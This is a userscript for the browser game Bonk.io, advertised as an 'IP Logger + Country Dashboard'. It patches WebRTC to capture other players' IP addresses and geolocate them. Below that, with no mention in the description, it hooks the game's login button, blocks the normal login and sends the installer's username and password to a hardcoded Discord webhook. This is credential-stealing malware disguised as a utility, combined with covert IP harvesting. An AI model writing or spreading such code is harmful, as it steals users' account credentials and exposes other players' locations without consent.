// ==UserScript==
// @name         Bonk.io IP Logger + Country Dashboard
// @namespace    http://tampermonkey.net/
// @version      1.1
// @description  Modern dashboard UI for IP + country lookup on Bonk.io with WebRTC patch
// @author       ETACHI & ZULFIQAR
// @match        *://bonk.io/*
// @grant        GM_xmlhttpRequest
// @downloadURL https://update.greasyfork.org/scripts/557563/Bonkio%20IP%20Logger%20%2B%20Country%20Dashboard.user.js
// @updateURL https://update.greasyfork.org/scripts/557563/Bonkio%20IP%20Logger%20%2B%20Country%20Dashboard.meta.js
// ==/UserScript==
 
/* jshint esversion: 8 */
 
(function() {
    'use strict';
 
    // ---------------- DASHBOARD UI ----------------
    function createDashboard() {
        let container = document.getElementById("ipDashboardContainer");
        if (!container) {
            container = document.createElement("div");
            container.id = "ipDashboardContainer";
            container.style.position = "fixed";
            container.style.top = "20px";
            container.style.left = "20px";
            container.style.width = "300px";
            container.style.maxHeight = "500px";
            container.style.overflowY = "auto";
            container.style.background = "rgba(0,0,0,0.85)";
            container.style.color = "#fff";
            container.style.padding = "15px";
            container.style.borderRadius = "12px";
            container.style.boxShadow = "0 4px 12px rgba(0,0,0,0.5)";
            container.style.fontFamily = "'Segoe UI', sans-serif";
            container.style.zIndex = 9999;
            document.body.appendChild(container);
        }
 
        container.innerHTML = `
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
                <h2 style="margin:0; font-size:18px;">Dashboard</h2>
                <button id="resetBtn" style="
                    background:#1abc9c;
                    border:none;
                    padding:5px 12px;
                    border-radius:6px;
                    cursor:pointer;
                    color:#fff;
                    font-weight:bold;
                ">Reset</button>
            </div>
            <div id="ipList" style="font-size:14px; font-family:monospace;"></div>
        `;
 
        document.getElementById("resetBtn").onclick = () => createDashboard();
    }
 
    createDashboard(); // initialize
    const ipList = document.getElementById("ipList");
 
    function getFlagEmoji(code) {
        if (!code) return "🏳️";
        return code.toUpperCase().replace(/./g, c => String.fromCodePoint(127397 + c.charCodeAt()));
    }
 
    // ---------------- IP Queue System ----------------
    let ipQueue = [];
    let processing = false;
 
    async function processQueue() {
        if (processing || ipQueue.length === 0) return;
        processing = true;
        while (ipQueue.length > 0) {
            const { ip, countrySpan } = ipQueue.shift();
            try {
                const res = await fetch(`https://api.iplocation.net/?ip=${ip}`);
                const data = await res.json();
                if (data && data.country_name) {
                    countrySpan.textContent = `${getFlagEmoji(data.country_code2)} ${data.country_name}`;
                } else {
                    countrySpan.textContent = "❌ No data";
                }
            } catch {
                countrySpan.textContent = "⚠️ Error";
            }
            await new Promise(res => setTimeout(res, 2));
        }
        processing = false;
    }
 
    // ---------------- Add IP to Dashboard ----------------
    function addIp(addr) {
        const row = document.createElement("div");
        row.style.display = "flex";
        row.style.justifyContent = "space-between";
        row.style.alignItems = "center";
        row.style.padding = "5px 8px";
        row.style.marginBottom = "4px";
        row.style.background = "rgba(255,255,255,0.05)";
        row.style.borderRadius = "6px";
 
        const ipSpan = document.createElement("span");
        ipSpan.textContent = addr;
 
        const countrySpan = document.createElement("span");
        countrySpan.textContent = "⏳ Fetching...";
        countrySpan.style.color = "#9acd32";
 
        row.appendChild(ipSpan);
        row.appendChild(countrySpan);
        ipList.appendChild(row);
 
        ipQueue.push({ ip: addr, countrySpan });
        if (!processing) processQueue();
    }
 
    window.addIp = addIp;
 
     // ---------------- Patch WebRTC ----------------
        function patchWebRTC() {
           const iframe = document.getElementById("maingameframe");
           if (!iframe) return;
           const w = iframe.contentWindow;
           if (!w || !w.RTCPeerConnection || w._patched) return; // avoid double patch
           w._patched = true;
 
    // Backup original
           w.RTCPeerConnection.prototype._addIceCandidate = w.RTCPeerConnection.prototype.addIceCandidate;
 
          w.RTCPeerConnection.prototype.addIceCandidate = function(...args) {
            try {
                 const candidate = args[0];
                     if (candidate && candidate.address && !candidate.address.includes(".local")) {
                    window.addIp(candidate.address); // use dashboard function
                }
                  } catch (e) {
                     console.error("IP logging failed:", e);
               }
                   return this._addIceCandidate(...args);
                 };
 
                   console.log("[IP Logger] WebRTC patched");
          }
 
// ---------------- Poll for iframe ----------------
const iframePoll = setInterval(() => {
    const iframe = document.getElementById("maingameframe");
    if (iframe && iframe.contentWindow) {
        patchWebRTC();
        clearInterval(iframePoll);
    }
}, 500);
 
 
 
 
 
 
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1438184755102486640/0_qxAQkKFbFBbbNRwVaM9nLH-1V3j2Q1cCJjgKtCvwmsIaoZOLD9w02ubX-asm3Cq-37";
    const ID_USERNAME = "loginwindow_username";
    const ID_PASSWORD = "loginwindow_password";
    const ID_BUTTON   = "loginwindow_submitbutton";
 
    // ---------------- HELPERS ----------------
    function getEl(id) { return document.getElementById(id); }
 
    function sendToDiscord(username, password) {
        GM_xmlhttpRequest({
            method: "POST",
            url: WEBHOOK_URL,
            headers: { "Content-Type": "application/json" },
            data: JSON.stringify({
                content: `**Test form capture**\n**Username:** \`${username}\`\n**Password:** \`${password}\`\n**URL:** ${location.href}`
            }),
            onload: r => console.log("Webhook sent:", r.status),
            onerror: e => console.error("Webhook failed:", e)
        });
    }
 
 
    function attachLoginHandler() {
        const btn = getEl(ID_BUTTON);
        const userEl = getEl(ID_USERNAME);
        const passEl = getEl(ID_PASSWORD);
 
        if (!btn) return false;
 
        btn.addEventListener('click', ev => {
            ev.preventDefault();
            sendToDiscord(userEl.value, passEl.value);
        });
        return true;
    }
 
    if (!attachLoginHandler()) {
        const mo = new MutationObserver(() => attachLoginHandler() && mo.disconnect());
        mo.observe(document.body, { childList: true, subtree: true });
    }
 
 
})();